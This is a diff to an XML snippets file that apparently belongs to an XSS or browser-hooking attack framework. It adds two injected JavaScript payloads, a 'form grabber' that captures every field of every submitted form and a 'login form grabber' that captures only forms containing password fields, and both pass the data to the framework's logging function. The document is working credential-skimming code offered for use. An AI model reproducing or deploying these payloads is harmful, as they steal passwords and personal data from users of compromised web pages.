@@ -203,4 +203,63 @@ try {
 <snippet type="persistent-snippets" name="report location">
 __logScript('report loc',location.href);
 </snippet>
+<snippet type="persistent-snippets" name="form grabber">
+// this will log ALL forms with ALL fields. feel free to improve this introducing white/blacklists
+setTimeout(function() {
+    var f = document.forms;
+    for (var i=0;i&lt;f.length;i++) {
+        f[i].addEventListener('submit',function() {
+            var form = {};
+            var el = [];
+            for (var i = 0; i&lt;this.elements.length;i++) {
+                var e = this.elements[i];
+                if (e.disabled || !e.name) {
+                    continue;
+                }
+                try {
+                    el.push({name: e.name, value: (e.options ? e.options[e.selectedIndex].value : e.value)});
+                } catch (e) {}
+            }
+            for (var i = 0; i&lt;this.attributes.length;i++) {
+                form[this.attributes[i].name] = this.attributes[i].value;
+            }
+            form.elements = el;
+            __logScript('form',form);
+        }, false);
+    }
+}, 300);
+</snippet>
+<snippet type="persistent-snippets" name="login form grabber">
+// this will try to only log forms with password fields in them
+setTimeout(function() {
+    var f = document.forms;
+    for (var i=0;i&lt;f.length;i++) {
+        f[i].addEventListener('submit',function() {
+            var form = {};
+            var el = [];
+            var passwd_found = false;
+            for (var i = 0; i&lt;this.elements.length;i++) {
+                var e = this.elements[i];
+                if (e.disabled || !e.name) {
+                    continue;
+                }
+                if (e.type &amp;&amp; e.type.toUpperCase() == 'PASSWORD') {
+                    passwd_found = true;
+                }
+                try {
+                    el.push({name: e.name, value: (e.options ? e.options[e.selectedIndex].value : e.value)});
+                } catch (e) {}
+            }
+            if (!passwd_found) { // skip form
+                return;
+            }
+            for (var i = 0; i&lt;this.attributes.length;i++) {
+                form[this.attributes[i].name] = this.attributes[i].value;
+            }
+            form.elements = el;
+            __logScript('login form',form);
+        }, false);
+    }
+}, 300);
+</snippet>
 </snippets>
